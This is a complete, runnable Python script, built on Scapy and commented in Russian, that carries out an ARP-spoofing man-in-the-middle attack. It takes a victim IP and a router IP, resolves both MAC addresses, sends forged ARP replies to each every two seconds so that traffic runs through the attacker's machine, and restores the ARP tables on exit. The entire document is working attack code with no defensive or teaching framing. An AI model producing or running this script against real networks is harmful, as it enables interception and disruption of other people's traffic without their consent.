from scapy.all import *
import sys
import time

def get_mac(ip):
    # Отправка ARP-запроса
    print(f"[DEBUG] Sending ARP request to resolve MAC address for IP: {ip}")
    ans, unans = sr(ARP(op=1, pdst=ip), timeout=2, retry=10)
    for s, r in ans:
        return r[ARP].hwsrc
    return None

def arp_spoof(dest_ip, dest_mac, source_ip):
    # Создание и отправка поддельного ARP-пакета
    packet = ARP(op=2, hwsrc=get_if_hwaddr(conf.iface), psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)
    print(f"[DEBUG] Sent spoofed ARP packet: {source_ip} is-at {get_if_hwaddr(conf.iface)} to {dest_ip}")

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    # Восстановление ARP-таблиц
    packet = ARP(op=2, hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False, count=5)
    print(f"[DEBUG] Sent ARP restore packet: {source_ip} is-at {source_mac} to {dest_ip}")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <victim_ip> <router_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    victim_mac = get_mac(victim_ip)
    if victim_mac is None:
        print(f"Could not find MAC address for {victim_ip}")
        sys.exit(1)

    router_mac = get_mac(router_ip)
    if router_mac is None:
        print(f"Could not find MAC address for {router_ip}")
        sys.exit(1)

    print("Starting ARP spoofing... Press Ctrl+C to stop.")
    try:
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        print("ARP tables restored. Exiting.")
        sys.exit(0)

if __name__ == "__main__":
    main()
